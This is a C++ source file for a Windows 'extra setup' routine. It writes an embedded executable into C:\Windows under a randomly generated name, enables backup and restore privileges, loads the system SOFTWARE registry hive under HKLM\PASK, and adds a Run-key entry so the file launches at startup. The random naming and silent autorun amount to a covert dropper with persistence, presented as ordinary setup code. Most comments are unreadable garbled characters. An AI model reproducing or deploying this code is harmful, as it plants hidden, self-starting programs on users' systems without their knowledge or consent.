#include "StdAfx.h"
#include "Resource.h"
#include "ExtraSetup.h"
#include "Util.h"
#include "util/StringEx.h"
#include "util/Logger.h"
#include "util/WinRegs.h"

CExtraSetup::CExtraSetup(void)
{
}


CExtraSetup::~CExtraSetup(void)
{
}

BOOL CExtraSetup::SetPrivilege(
    HANDLE hToken,              // access token handle
    LPCWSTR nameOfPrivilege,   // name of privilege to enable/disable
    BOOL bEnablePrivilege     // to enable or disable privilege
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValue(
        NULL,               // lookup privilege on local system
        nameOfPrivilege,   // privilege to lookup 
        &luid))           // receives LUID of privilege
    {
        LOG_ERROR("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        LOG_ERROR("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        LOG_ERROR("The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}

UINT CExtraSetup::AddExtraSetup()
{
	// ����Դ���ͷ��ƹ�����İ�װ���򣬽����ŵ�C:\Windows��������һ���������
	srand(GetTickCount());
	char randName[10] = {0};
	for (int i=0; i!=sizeof(randName)-1; i++)
	{
		char c = 'a' + rand() % 26;
		if (rand() % 2) //�����Сд
		{
			c = toupper(c);
		}
		randName[i] = c;
	}
	randName[9] = 0;
	std::string strDest = "C:\\Windows\\";
	strDest += randName;
	strDest += ".exe";
	if (!CUtil::ExtractResource(MAKEINTRESOURCE(IDR_BIN_EXTRA_SETUP),L"BIN",String(strDest).toStdWString().c_str(),NULL))
	{
		LOG_ERROR("Extract install tool failed");
		return ExtractFileFailed;
	}
	// ����C���µ�ע���
	HANDLE proccessHandle = GetCurrentProcess();     // get the handle to the current proccess
	DWORD typeOfAccess = TOKEN_ADJUST_PRIVILEGES;   //  requiered to enable or disable the privilege
	HANDLE tokenHandle;                             //  handle to the opened access token
	if (OpenProcessToken(proccessHandle, typeOfAccess, &tokenHandle))
	{
		// Enabling RESTORE and BACKUP privileges
		SetPrivilege(tokenHandle, SE_RESTORE_NAME, TRUE);
		SetPrivilege(tokenHandle, SE_BACKUP_NAME, TRUE);
	}
	else
	{
		LOG_ERROR("Error getting the access token.\n");
		return GetAccessTokenFailed;
	}
	// Loading the HIVE into HKLM\PASK subkey
	// �����ļ�C:\windows\system32\config\SOFTWARE��HKLM\PASK��
	HKEY hKey = HKEY_LOCAL_MACHINE;
	LPCWSTR subKeyName = L"PASK";
	LPCWSTR pHive = L"C:\\Windows\\system32\\config\\SOFTWARE";
	LONG loadKey = RegLoadKeyW(hKey, subKeyName, pHive);
	if (loadKey != ERROR_SUCCESS)
	{
		LOG_ERROR("Error loading the key. Code: %li\n", loadKey);
		return LoadKeyFailed;
	}
	else
	{
		LOG_INFO("Hive file has been loaded.\n");
		//�������ǿ��Դ�HKEY_LOCAL_MACHINE\PASK\Microsoft\Windows\CurrentVersion\Run�����д���ֵ��
		RegistrySetValueString(HKEY_LOCAL_MACHINE,"PASK\\Microsoft\\Windows\\CurrentVersion\\Run",randName,(char*)strDest.c_str(),FALSE);
	}
	return 0;
}
